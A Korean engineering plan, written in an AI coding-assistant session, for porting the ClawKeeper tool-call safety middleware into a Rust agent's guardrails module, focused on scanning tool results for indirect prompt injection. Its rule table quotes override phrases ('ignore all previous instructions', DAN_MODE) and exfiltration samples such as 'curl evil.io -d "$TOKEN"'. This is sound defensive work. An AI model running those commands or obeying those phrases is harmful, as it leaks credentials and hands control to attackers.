> **스냅샷 안내**: 이 문서는 2026-09-02 세션에서 Claude Code 플랜 모드로 작성한
> `tinicore/src/guardrails/` 포팅 계획의 스냅샷이다. **아직 승인/실행 전** —
> ARGO 저장소(`~/Works/ARGO-ClawKeeper`)에는 어떤 코드 변경도 적용되지 않았다.
> 배경 분석은 [`20260902-clawkeeper-argo-analysis.md`](./20260902-clawkeeper-argo-analysis.md) 참고.

---

# ClawKeeper → tinicore/src/guardrails 포팅 (1차: TDD)

## Context

ClawKeeper(`SafeAI-Lab-X/ClawKeeper`, Python)는 hermes-agent에 붙어 툴 호출 전후를
검사하는 안전 미들웨어다. 이 기능을 ARGO `tinicore/src/guardrails/`로 가져오는 것이 목표다.

**사전 조사 결과 범위가 크게 줄었다.** ClawKeeper 가드 8개 중 실제로 ARGO에 없는 것은
2개뿐이고, 가장 가치 있다고 봤던 `return_content_scan`은 **탐지 로직이 이미 ARGO에
완성돼 있으며 호출되는 지점만 다르다**. 따라서 이번 작업의 본질은
"ClawKeeper 이식"이 아니라 **이미 있는 탐지기를 안 보고 있는 지점(런타임 툴 결과)에
연결하고, 진짜 빈 곳 2개만 새로 만드는 것**이다.

**이번 라운드 범위: `tinicore/src/guardrails/` 디렉터리만 수정.** CLI 배선은 다음 라운드.

---

## 0. ARGO의 기존 민감정보 파이프라인 (신규 코드가 앉을 자리)

```
tinicore-traits::sensitive::SensitiveDetector      ← 탐지기 트레잇
          ▲ 워크스페이스 전체에서 실제 구현은 이것 하나뿐
tinicore/src/guardrails/detector.rs:475  PiiSpanDetector    ← feature "guardrails" (기본 OFF)
          ▼ 소비
tinicore/src/sensitive/  (feature "sensitive", 기본 ON, 3442줄)
  ├ chain.rs (792)      DetectorChain — 탐지기 N개를 한 모양으로
  ├ redaction.rs (1846) 마스킹/복원 vault (라운드트립 보장)
  └ guardrail.rs (635)  차단용 래퍼
          ▼
tinicore/src/agent/pii_masking.rs   EgressMask — LLM 송신 직전 마스킹 지점
          ▼
tinicli/src/guardrails/pii.rs       install_pii() — 호스트 배선
```

확인된 사실:

- **`PiiSpanDetector`가 워크스페이스 유일의 실제 `SensitiveDetector` 구현이다.**
  나머지(`FakeGate`/`ErrGate`/`NoLabelGate`/`NeedleGate`/`MockSensitiveDetector`/
  `Probe`/`Boom`/`Kinded`/`Needle`/`FixedSpanGate`)는 전부 테스트 더블.
- `pii_masking.rs`는 `PiiSpanDetector`를 언급조차 하지 않는다 — `Arc<dyn SensitiveDetector>`로
  제네릭하게만 받는다. **파이프라인은 기계장치, 내용물은 guardrails의 PII 엔진 하나.**
- `sensitive`는 기본 ON인데 `guardrails`는 기본 OFF다 → 마스킹 기계는 항상 컴파일되지만
  **꽂을 탐지기가 컴파일되지 않아 탐지 0건**인 상태가 기본값이다. 실제 활성화 조건은
  `guardrails` feature + `pii_mode` 설정(`tinicli/src/cli_entry.rs:388`) 둘 다.

**설계된 확장 지점**: `chain.rs` 문서가 명시적으로 다중 탐지기를 상정한다.

```
capable host      DetectorChain[ ModelHead ]
constrained host  DetectorChain[ RegexPii, CredScan, Needles ]
mixed             DetectorChain[ RegexPii, ModelHead ]
```

→ 새 스캐너의 정석 자리는 **"체인에 `SensitiveDetector` 하나 더 추가"**이지 별도 시스템이
아니다. 단 이는 *마스킹/차단 대상 값 탐지*에 해당한다. 아래에서 만들 가드들은
"지시문 탐지 → 툴 호출 차단"이라 성격이 달라 `ToolInputGuardrail`/`ToolOutputGuardrail`
쪽에 붙는다. 두 축을 섞지 않는다.

---

## 1. 중복 분석 — 무엇을 만들고 무엇을 재사용하나

| ClawKeeper 가드 | ARGO 기존 자산 | 결정 |
|---|---|---|
| `return_content_scan` (툴 결과 PI 스캔) | **`dispatchable_policy::audit_text()`** — 룰 23개/카테고리 6종. 단 등록 시점에만 호출 | **탐지기 재사용 + 적용 지점 신규** |
| `credential_redact` (패턴 기반 시크릿) | PII 엔진 인식기 49종 + audit.rs `CredentialAccess` 8종 | **스킵** |
| `script_body_scan` (동적 경로 조립) | 대응물 없음 | **신규 구현** |
| `url_safety` (SSRF + 호모글리프) | `guardrails_exfil/url_scan.rs`는 URL *추출*만 | **부분 신규** (추출 재사용) |
| `exec_gate` (위험명령 정규식 49) | `guardrails_tool_input/command_safety.rs` (1859 LOC) | **스킵** |
| `path_guard` (보호 경로 glob 7) | `secret_path.rs` + `path_boundary.rs` | **스킵** |
| `input_validator` | `guardrails_tool_input/mod.rs` G1 arg-shape | **스킵** |
| `budget` (토큰 예산) | — | **스킵** (가드 아님, `Path::home()`/env 읽기는 Core 규칙 위반) |

### 1-A. `audit_text()` — 이미 완성된 탐지기

`tinicore/src/dispatchable_policy/audit.rs` (2313줄). runkids/skillshare의 `internal/audit`를
Rust로 이식한 것으로, 공개 API는 `pub fn audit_text(text: &str, source: &Path) -> AuditReport`
(`:1016`). 룰 테이블 23개 / `Category` 6종(`:182`):

| 카테고리 | 룰 수 | 내용 | ClawKeeper 대응 |
|---|---|---|---|
| `PromptInjection` | 4 (`:242-266`) | "ignore all previous instructions", `SYSTEM: override`, `DAN_MODE`, `<system>`/`<override>` 태그 | `override` |
| `DataExfiltration` | 4 (`:275-346`) | `curl evil.io -d "$TOKEN"`, `wget --post-data=$AWS_SECRET`, 쿼리파라미터 붙은 외부 이미지 | `embedded_directive` |
| `CredentialAccess` | 8 (`:366-450`) | ssh-private-key, aws-access-key, github-pat, github-actions-token, **anthropic-key**, **openai-key**, google-api-key, slack-token | `credential_redact` |
| `InvisiblePayload` | 2 (`:459-472`) | Unicode tag 코드포인트 `U+E0001-E007F` (Pillar Security "Rules File Backdoor") | `invisible_chars` |
| `Obfuscation` | 3 (`:488-518`) | base64→`bash/sh/zsh`(GNU `--decode`/macOS `-D` 포함), hex→shell, ANSI 이스케이프 | `base64_decoded_to_shell` |
| `Privilege` | 2 (`:527-535`) | `chmod 777`, setuid root | — |

부가 기능: `Severity` 사다리(`:124`), `AuditConfig::block_threshold`(`:836`),
`<vault>/.argo/audit-waivers.yaml` 기반 면제(`Waiver`, `:805`), 룰 간 포섭
(`subsumed_by_rule_ids`), `format_blocker_summary`(`:989`).

**하지만 호출자는 등록 경로 둘뿐이다:**
`tools/registry/store.rs:418`, `dispatchable_policy/discovery.rs:731` — 스킬/툴 매니페스트가
레지스트리에 들어올 때만 검사한다. **런타임 툴 실행 결과에는 아무도 돌리지 않는다.**

→ ClawKeeper가 지적하는 구멍("툴 결과가 간접 프롬프트 인젝션의 주 운반체인데 검사되지
않는다")은 ARGO에도 그대로 있다. 다만 **탐지기를 새로 쓸 이유는 없고, 부르지 않는 곳에서
부르면 된다.** ClawKeeper의 PI 패턴 60개를 이식하지 않는다 — 커버리지가 겹치는 룰
테이블 두 벌은 유지보수 부채다.

### 1-B. `credential_redact`를 스킵하는 이유

두 겹으로 이미 커버된다.

1. **PII 엔진** (`config/pii_filter_config.yaml`, 인식기 49종 중 ~40종이 시크릿/토큰):
   github ×7, aws-access-key-id ×2, stripe ×2, `api_key`(=`Bearer [\w\.\=\-]{10,}`),
   `password`/`password_strict`, `certificate`(`-----BEGIN (PUBLIC|PRIVATE) KEY-----`),
   Slack ×5, GCP/Google ×5, Twilio, Twitter, PayPal, Braintree, Mailgun, Mailchimp,
   Square ×2, Facebook ×2 등. `deidentifier_config`로 **마스킹**까지 수행.
2. **audit.rs `CredentialAccess`** 8종 — PII 엔진에 없던 `openai-key`/`anthropic-key` 포함.

ClawKeeper 9개 패턴 중 이 둘로 안 덮이는 것은 사실상 `jwt`뿐이다.

> **단, 목적이 다르다는 점은 유지한다.** PII 엔진은 *마스킹*(값을 가려서 LLM에 전달),
> audit.rs는 *차단*(등록 거부). 따라서 egress 마스킹 관점에서는 `jwt`,
> `aws_secret_key`(40자 base64 — 현재 access key **id**만 있음)를 PII 인식기로 추가하는
> 것이 여전히 유효하다. 이때 정규식은 ClawKeeper가 아니라 **audit.rs의 기존 패턴에서
> 가져온다**(같은 레포 안에서 표현이 갈리지 않도록).

### 1-C. `exec_gate`/`path_guard`를 스킵하는 이유 (패러다임 차이)

- ARGO `command_safety.rs`: **화이트리스트 + argv 파서**. `UNCONDITIONALLY_SAFE:56`,
  `FIND_UNSAFE:64`, `GIT_UNSAFE_GLOBAL:88`, `REJECTED_SHELL_CHARS:145`, sudo/env 래퍼
  분해(`:556`). "안전 증명 실패 → Unknown → Ask 에스컬레이션"의 3-상태.
- ClawKeeper `exec_gate`: **블랙리스트 정규식**, 미매치 시 통과(2-상태).

argv를 실제로 파싱하는 화이트리스트가 pre-exec 게이트에선 엄격히 더 강하다.
`secret_path.rs`도 `.aws/credentials`, `.ssh/*`(단 `known_hosts`/`config`/`authorized_keys`
제외), `.gnupg`, `.kube/config`를 구분해 갖고 있어 ClawKeeper의 glob 7줄보다 세밀하다.

### ⚠ 기존 팩은 "구현·룰은 있으나 기본 OFF"

`install_guardrails_from_env`(`agent/guardrails.rs:1020`)는 tool-input/exfil 팩을
`{PREFIX}_GUARDRAIL_TOOL_PACK` / `_EXFIL` 환경변수에 JSON이 있을 때만 설치하고, 없으면
`None`으로 두어 체인에 등록조차 하지 않는다(`:1066`, `:1088`). 레포 전체에서 이 환경변수를
기본 세팅하는 곳은 없다(설치 경로는 `tinicli/src/cli_entry.rs:158`,
`tiniffi/src/lib.rs:28645` 둘뿐, 둘 다 설정 기반). Core 레이어 규칙의 결과다.

→ **사용자 체감 갭의 진짜 원인은 "구현 부재"가 아니라 "기본 정책 미배포"**다.
이번 라운드에서 만든 것도 같은 관례(호스트 공급 설정 + 기본 비활성)를 따르되,
배포 문제는 배선 라운드의 핵심 과제로 다룬다.

---

## 2. 변경 후 디렉터리 구조

```
tinicore/src/guardrails/
├── mod.rs                    # 파사드: pii 재export(기존 API 그대로) + clawkeeper/common 공개
├── config/                   # ★ 이동 금지 (layer_coverage_guard.rs가 include_str!로 참조)
│   ├── pii_filter_config.yaml
│   └── default/ROUTING_NUMBER.txt
├── pii/                      # ← 기존 .rs 8개를 git mv (내용 무변경)
│   ├── mod.rs  config.rs  detector.rs  error.rs  filter.rs
│   ├── recognizer.rs  validator.rs  hook.rs
│   └── handwritten/{mod,aho_corasick_detector,card_detector}.rs
├── common/                   # ★ 신규 코드만 (기존 PII 코드는 꺼내지 않음)
│   ├── mod.rs
│   ├── severity.rs           # Severity — audit.rs의 Severity로 매핑
│   └── rule_set.rs           # RegexSet 프리필터 + 룰별 스팬 추출
└── clawkeeper/               # ★ 신규
    ├── mod.rs                # ClawKeeperPackConfig, 팩 생성
    ├── event.rs              # GuardEvent, Direction
    ├── verdict.rs            # Verdict, Outcome, Evidence
    ├── chain.rs              # run_guard_chain (fail-open)
    ├── return_content_scan.rs  # audit_text() 얇은 어댑터 (룰 이식 없음)
    ├── script_body_scan.rs     # 신규 로직
    └── url_safety.rs           # url_scan 재사용 + SSRF/호모글리프 판정
```

### `common/`은 "추출"이 아니라 "신규 채우기"

`recognizer.rs:57`의 `MatchEngine` 트레잇은 도메인 중립이지만 `PatternMeta`(`:40-50`)가
PII 전용 필드를 갖고 후처리(boundary → validate → dedup → 문맥어 스코어링)가 그걸 직접
읽는다. 일반화하려면 스코어링까지 일반화해야 하는데 ClawKeeper 가드는 "정규식 매치 →
스팬 보고"만 필요해서 얻는 게 없다. → `common/`은 plain `regex` 기반 신규 코드로 채운다.
PII는 이번 라운드에 `common/`을 소비하지 않는다(커밋 메시지에 명시).

의존성 추가 불필요: `regex`(Cargo.toml:1234), `aho-corasick`(:1236), `serde_yaml`(:1165),
`url`(:1239) 모두 non-optional.

---

## 3. 타입 설계 (동기, 순수 함수)

Python의 두 반환 방언(dict-always / canonical-or-None)을 **하나의 `Verdict`로 통합**,
`None` = 판단 보류.

```rust
pub struct GuardEvent {
    pub tool_name: String,
    pub direction: Direction,          // PreToolCall | PostToolCall | ReturnContent
    pub command: String,
    pub description: String,
    pub params: BTreeMap<String, String>,
    pub content: Option<String>,
    pub session_id: Option<String>,
}

pub struct Verdict {
    pub block: bool,
    pub outcome: Outcome,              // Allow | Deny (Ask는 생산자 없음 → 만들지 않음)
    pub source: String,                // "url_safety:homoglyph" 등
    pub severity: Severity,
    pub reason: String,
    pub evidence: Evidence,
}

pub trait Guard: Send + Sync {
    fn name(&self) -> &str;
    fn check(&self, ev: &GuardEvent) -> Result<Option<Verdict>, GuardError>;
}

pub fn run_guard_chain(guards: &[&dyn Guard], ev: &GuardEvent, stop_on_block: bool)
    -> (Option<Verdict>, Vec<Verdict>);
```

**fail-open은 `catch_unwind`가 아니라 `Result`로.** `UnwindSafe`가 `&dyn Guard`를 타고
안 흐르고, `panic="abort"`에선 무의미하며, 이 레포엔 production-panic 감사가 있다.
체인은 `Err`를 `{block:false, severity:Low, source:guard.name()}`로 합성 →
`test_chain_does_not_propagate_guard_exceptions` 계약 재현.

`Severity`는 audit.rs의 `Severity`(`:124`)로 매핑해 레포 안에서 심각도 축이 갈리지 않게 한다.

---

## 4. `return_content_scan` = audit_text 어댑터

새 룰을 쓰지 않는다. 하는 일은 세 가지뿐:

1. `GuardEvent.content`(툴 결과 텍스트)를 꺼낸다
2. `dispatchable_policy::audit_text(text, source)` 호출 — `source`는 툴 이름 기반 합성 경로
3. `AuditReport`의 최고 심각도 finding을 `Verdict`로 변환 (임계값은 설정으로)

검증 포인트: audit.rs 룰은 **스킬 매니페스트**를 겨냥해 작성됐으므로, 툴 결과 텍스트에
적용했을 때의 오탐률을 테스트로 측정한다(예: 정상 `git log` 출력, HTML 본문, JSON 응답이
`data-exfiltration-*`이나 `privilege-*`에 걸리지 않는지). 오탐이 나오는 룰은
설정으로 카테고리 단위 opt-out을 제공한다.

> `audit.rs`는 `dispatchable_policy` 모듈이라 `guardrails`에서 `crate::` 경로로 호출 가능하다
> (feature 게이트 없이 항상 컴파일됨). 다만 의존 방향이 늘어나므로
> `audit_core_layer_deps.py` 통과 여부를 1번 커밋 직후 확인한다.

---

## 5. 설정 전략 (Core 레이어 규칙 준수)

- **임베드 가능**: 콘텐츠 정규식(행위 중립적). PII 엔진의 `include_str!` 선례(`mod.rs:39`).
- **호스트 공급 필수**: 툴 이름 목록(`HIGH_RISK_TOOLS` 등)·경로·호스트. 기본값 빈 목록.
- `_BLOCKED_HOSTNAMES`(클라우드 메타데이터 IP)는 범용 인프라라 leak 감사에 안 걸리지만
  Core 리뷰어 지적 여지가 있으니 config override 제공.
- **`OnceLock` 전역 캐시 쓰지 않는다.** 리셋 불가라 Python의 `reset_*_cache()` 대응물이
  없고 테스트 순서가 결과에 영향을 준다. 각 가드가 컴파일된 `RuleSet`을 소유하고 설정을
  명시적으로 주입받으면 문제 자체가 사라진다.
- 스킵한 `exec_gate`/`path_guard`가 유일한 fail-closed 소비자였으므로 **`FailurePolicy`
  enum을 만들지 않는다**(변종 하나뿐인 enum은 `-D warnings`에 걸림).

---

## 6. 작업 순서 (TDD)

**Rust에선 "빨간 커밋"을 만들 수 없다** — `mod x;`가 없으면 모듈이 빌드에 안 들어가고,
테스트만 있는 커밋은 nextest와 `-D warnings`를 깬다. red 단계는 **워킹트리 상태**로 두고
(테스트 먼저 작성 → 구현), 커밋은 테스트+구현을 함께 담되 메시지에 "tests first"를 명시한다.
`#[ignore]`로 가짜 red를 만들지 않는다.

테스트는 **`src` 안 inline `#[cfg(test)] mod tests`** — Cargo.toml을 안 건드려도 되어
"guardrails 디렉터리만 수정" 제약을 정확히 지키고, tinicore가 이미 6개 파일에서 쓰는 방식이다.
(통합 테스트는 외부 소비자가 생기는 배선 라운드에 `tests/guardrails/clawkeeper/` +
`Cargo.toml [[test]]`로 추가 — 이번 라운드엔 단위 테스트와 중복될 뿐이다.)

| # | 커밋 | 내용 |
|---|---|---|
| 1 | PII 이동 | 순수 `git mv`로 `.rs` 8개 → `pii/`. `mod.rs`는 `pub use`로 기존 공개 API 유지. **내용/포맷 수정 금지**(rename 감지가 깨짐). `git show -M --stat`으로 검증 |
| 2 | `common/` | `Severity`(audit.rs 매핑), `RuleSet` + inline 테스트 |
| 3 | `clawkeeper/{event,verdict,chain}` | `test_adapter_base.py` 7개 케이스 이식 (체인 순서, stop_on_block, fail-open) |
| 4 | `return_content_scan` | `audit_text()` 어댑터 + **오탐 측정 테스트**(정상 툴 출력이 안 걸리는지) |
| 5 | `script_body_scan` | 근접도(≤500자) 휴리스틱, 외부 의존 없음 |
| 6 | `url_safety` | `guardrails_exfil::url_scan::extract_urls` 재사용 + `std::net::IpAddr`로 사설/링크로컬/CGNAT 판정 + 호모글리프 |
| 7 | PII 인식기 보강 (선택) | `pii_filter_config.yaml`에 `jwt`, `aws_secret_key` 추가 — **정규식은 audit.rs에서 가져옴**. 마스킹 관점 갭 해소 |

### 이식할 테스트 계약 (출처)
`tests/test_adapter_base.py`(체인) · `test_script_body_scan.py` · `test_url_safety.py`
→ `test_return_content_scan.py`는 **계약이 아니라 회귀 입력 샘플로만** 사용
(우리 룰은 audit.rs 것이므로 기대 출력이 다르다).
→ `test_guards.py`, `test_credential_redact.py`, Judge/Watcher/서버/MCP는 이식하지 않음.

---

## 7. 주의사항

- **`config/` 디렉터리는 절대 옮기지 않는다.** `tinicore/tests/guardrails/layer_coverage_guard.rs:29`가
  `include_str!("../../src/guardrails/config/pii_filter_config.yaml")`로 직접 참조한다.
  `.rs`만 `pii/`로 옮기고 `pii/mod.rs`의 `include_str!` 경로만 `"../config/..."`로 바꾼다.
- **1번 커밋은 ~6000줄 순수 rename** — 단독 커밋으로 유지해야 리뷰가 기계적으로 끝난다.
- **feature 게이트**: `guardrails`는 기본 OFF(`lib.rs:479-481`)라 신규 가드도 기본 빌드에서
  빠진다. `cargo clippy --workspace --all-targets`만으로는 **린트조차 안 된다** —
  반드시 `--features guardrails`로 clippy를 돌릴 것.
- **레이어 의존성**: `guardrails` → `dispatchable_policy` 의존이 새로 생긴다.
  `audit_core_layer_deps.py`로 확인 필요.
- `-D warnings` 대비: 생산자 없는 `Outcome::Ask`, 미사용 `Severity` 변종은 만들지 않는다.
- `layer_coverage_guard.rs` 래칫이 `filter_test.rs` 소스를 파싱한다 → 기존 테스트 파일은
  옮기거나 이름을 바꾸지 않는다.

---

## 8. 검증

```bash
cd /Users/byungchulso/Works/ARGO-ClawKeeper

# 신규 코드는 feature를 켜야 컴파일·린트됨
cargo clippy -p tinicore --features guardrails,sensitive --all-targets -- -D warnings
cargo nextest run --profile ci -p tinicore --features guardrails,sensitive,cognition,test-fixtures

# 1번(이동) 커밋 직후 rename 검증
git show -M --stat HEAD

# 기존 회귀 없음
cargo check -p tinicli --features guardrails
```

PR 전 필수 게이트 3종:

```bash
python3 scripts/audit_core_layer_deps.py --self-test && python3 scripts/audit_core_layer_deps.py
python3 scripts/audit_core_product_leak.py --self-test && python3 scripts/audit_core_product_leak.py
python3 scripts/audit_core_crate_name_leak.py --self-test && python3 scripts/audit_core_crate_name_leak.py
```

---

## 다음 라운드 (이번 범위 밖)

1. `ToolInputGuardrail`/`ToolOutputGuardrail`(`tinicore-traits/src/guardrail.rs:980,994`)
   어댑터로 `agent::guardrails::GuardrailSet`에 등록
2. `tinicli` 설정(`pii_mode` 옆) + `ARGO_GUARDRAIL_*` 환경변수 배선
3. **기본 정책 배포 문제** — 기존 tool-input/exfil 팩이 기본 OFF라 실제로는 아무 검사도
   돌지 않는다. Core는 정책을 하드코딩할 수 없으므로 권장 기본 설정을 호스트(tinicli)
   기본 프로필로 제공할지(opt-out으로 둘지) 결정해야 한다.
   **보안 효과 측면에서 이번 포팅보다 영향이 클 수 있다.**
4. `tests/guardrails/clawkeeper/` 통합 테스트 + `Cargo.toml [[test]]` 등록
